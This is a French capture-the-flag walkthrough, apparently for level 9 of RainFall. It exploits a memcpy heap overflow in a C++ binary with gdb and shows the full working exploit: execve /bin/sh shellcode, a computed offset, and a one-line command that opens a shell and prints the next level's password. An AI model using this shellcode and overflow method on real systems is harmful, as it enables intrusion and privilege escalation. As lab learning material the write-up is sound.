
# Level 9

En ouvrant level9 avec cuter on ce rend comp que le code est en c++ on remarque egalement qu'il n'y a ni `cat .pass` ni de `bin/sh` nous allons donc utiliser un shell code.
Pour ce level nous allons utiliser `gdb` pour voir les case memoir utiliser. Pour commencer on vas chercher a savoir quelle fonction son appeler
```
(gdb) info function
All defined functions:

Non-debugging symbols:
[...]
0x08048510 memcpy
0x08048510 memcpy@plt
[...]
---Type <return> to continue, or q <return> to quit---
```
on peut voir que le programme appel `memecpy` que nous pouvont overflow.
il nous reste a trouver a quelle address `segfault` le programme, nous allons donc tester avec 200 charater.
```
(gdb) run $(python -c 'print "a" * 200')
Starting program: /home/user/level9/level9 $(python -c 'print "a" * 200')

Program received signal SIGSEGV, Segmentation fault.
  0x08048682 in main ()
```
On peut voir que le programme `segfault`, on vas maintenant chercher a trouver l'offset, en entrant l'adresse on du `segfault` dans un buffer flow generator on ne trouve rien on vas donc chercher a savoir ou est stocker la chaine
```
(gdb) run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[...]
Program received signal SIGSEGV, Segmentation fault.
0x08048682 in main ()
(gdb) ir
Undefined command: "ir".  Try "help".
(gdb) i r
eax            0x41414141       1094795585
ecx            0x4141   16705
edx            0x804a0aa        134521002
ebx            0x804a078        134520952
esp            0xbffff670       0xbffff670
ebp            0xbffff698       0xbffff698
esi            0x0      0
edi            0x0      0
eip            0x8048682        0x8048682 <main+142>
eflags         0x210283 [ CF SF IF RF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
```
On peut voir qu'elle est dans *eax* car 'A' = 41 donc il suffit de faire la meme chose avec le paterne, de le mettre dans le generateur et il nous sort un offset de *108*. On a vut que le programe `segfault` bien a l'adresse `0x08048682`, il nous reste a voir a quelle instruction elle corespond.
```
(gdb) disas main
Dump of assembler code for function main:
   0x080485f4 <+0>: push %ebp
   0x080485f5 <+1>: mov %esp,%ebp
   0x080485f7 <+3>: push %ebx
   0x080485f8 <+4>: and $0xfffffff0,%esp
   0x080485fb <+7>: sub $0x20,%esp
   0x080485fe <+10>: cmpl $0x1,0x8(%ebp)
   0x08048602 <+14>: jg 0x8048610 <main+28>
   0x08048604 <+16>: movl $0x1,(%esp)
   0x0804860b <+23>: call 0x80484f0 <_exit@plt>
   0x08048610 <+28>: movl $0x6c,(%esp)
   0x08048617 <+35>: call 0x8048530 <_Znwj@plt>
   0x0804861c <+40>: mov %eax,%ebx
   0x0804861e <+42>: movl $0x5,0x4(%esp)
   0x08048626 <+50>: mov %ebx,(%esp)
   0x08048629 <+53>: call 0x80486f6 <_ZN1NC2Ei>
   0x0804862e <+58>: mov %ebx,0x1c(%esp)
   0x08048632 <+62>: movl $0x6c,(%esp)
   0x08048639 <+69>: call 0x8048530 <_Znwj@plt>
   0x0804863e <+74>: mov %eax,%ebx
   0x08048640 <+76>: movl $0x6,0x4(%esp)
   0x08048648 <+84>: mov %ebx,(%esp)
   0x0804864b <+87>: call 0x80486f6 <_ZN1NC2Ei>
   0x08048650 <+92>: mov %ebx,0x18(%esp)
   0x08048654 <+96>: mov 0x1c(%esp),%eax
   0x08048658 <+100>: mov %eax,0x14(%esp)
   0x0804865c <+104>: mov 0x18(%esp),%eax
   0x08048660 <+108>: mov %eax,0x10(%esp)
   0x08048664 <+112>: mov 0xc(%ebp),%eax
   0x08048667 <+115>: add $0x4,%eax
   0x0804866a <+118>: mov (%eax),%eax
   0x0804866c <+120>: mov %eax,0x4(%esp)
   0x08048670 <+124>: mov 0x14(%esp),%eax
   0x08048674 <+128>: mov %eax,(%esp)
   0x08048677 <+131>: call 0x804870e <_ZN1N13setAnnotationEPc>
   0x0804867c <+136>: mov 0x10(%esp),%eax
   0x08048680 <+140>: mov (%eax),%eax
=> 0x08048682 <+142>: mov (%eax),%edx
   0x08048684 <+144>: mov 0x14(%esp),%eax
   0x08048688 <+148>: mov %eax,0x4(%esp)
   0x0804868c <+152>: mov 0x10(%esp),%eax
   0x08048690 <+156>: mov %eax,(%esp)
   0x08048693 <+159>: call *%edx
   0x08048695 <+161>: mov -0x4(%ebp),%ebx
   0x08048698 <+164>: leave
   0x08048699 <+165>: ret
End of assembler dump.
```
On peut voir que le `segfault` lors du mov de l'edx dans l'eax, On cherche alors ou la string est stocke, on va donc creer un breakpoint a l'adresse apres le setAnnotation ou il y a un memcpy On relance le programme avec une string qui fonctionne comme 'aaaa', le breakpoint s'enclenche il nous reste donc qu'a print les valeurs que l'on veut
```
(gdb) b *main+136
Breakpoint 1 at 0x804867c
(gdb) run 'aaaa'
Starting program: /home/user/level9/level9 'aaaa'

Breakpoint 1, 0x0804867c in main ()
(gdb) x $eax
  0x804a00c: 0x61616161
(gdb) x $edx
  0x804a010: 0x00000000
(gdb)
```
Il nous reste meinenant qu'a cree le payload avec le shellcode qui nous avons deja utiliser dans les exercie precedant :
```
\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
```
ce qui nou donne
> L'adresse de l'edx (4) + shellcode (21) + offset (83) + l'adresse de eax (4)

il ne nous reste plus qu'a lexecuter :
```
level9@RainFall:~$ ./level9 $(python -c "print '\x10\xa0\x04\x08' + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + 'a' * 83 + '\x0c\xa0\x04\x08'")
$ whoami
bonus0
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
$
```